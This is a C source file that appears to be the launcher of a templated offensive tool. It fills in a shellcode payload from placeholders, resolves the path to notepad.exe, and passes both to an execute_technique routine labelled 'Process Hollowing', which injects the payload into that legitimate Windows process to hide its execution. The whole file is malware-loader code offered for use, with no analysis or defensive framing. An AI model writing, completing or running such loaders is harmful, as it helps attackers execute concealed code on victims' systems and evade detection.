#include <windows.h>
#include <stdio.h>

#include "execution_core.h"

static unsigned char g_payload[] = {
    {{PAYLOAD_BYTES_C}}
};

static const SIZE_T g_payload_len =
    (SIZE_T){{PAYLOAD_BYTES_LEN}};

#ifdef _WIN64
static const char *g_build_arch = "x64";
#else
static const char *g_build_arch = "x86";
#endif

int main(int argc, char *argv[])
{
    int result;
    char target_buf[MAX_PATH] = {0};
    const char *target = target_buf;

    UINT windows_len = GetWindowsDirectoryA(
        target_buf,
        MAX_PATH
    );

    if (
        windows_len == 0
        || windows_len >= MAX_PATH
    ) {
        fprintf(
            stderr,
            "[-] Failed to resolve Windows directory: %lu\n",
            GetLastError()
        );
        return 1;
    }

#ifdef _WIN64
    const char target_suffix[] =
        "\\System32\\notepad.exe";
#else
    const char target_suffix[] =
        "\\SysWOW64\\notepad.exe";
#endif

    if (
        windows_len
        + sizeof(target_suffix)
        > sizeof(target_buf)
    ) {
        fprintf(
            stderr,
            "[-] Target path exceeds MAX_PATH\n"
        );
        return 1;
    }

    for (
        size_t i = 0;
        i < sizeof(target_suffix);
        i++
    ) {
        target_buf[windows_len + i] =
            target_suffix[i];
    }

    if (argc > 1) {
        target = argv[1];
    }

    printf("[+] Technique : Process Hollowing\n");
    printf("[+] Build arch: %s\n", g_build_arch);
    printf(
        "[+] Payload   : %llu bytes\n",
        (unsigned long long)g_payload_len
    );
    printf("[+] Target    : %s\n", target);

    result = execute_technique(
        g_payload,
        g_payload_len,
        target
    );

    if (result != 0) {
        fprintf(
            stderr,
            "[-] Execution failed: %d\n",
            result
        );
        return 1;
    }

    printf("[+] Execution completed\n");
    return 0;
}
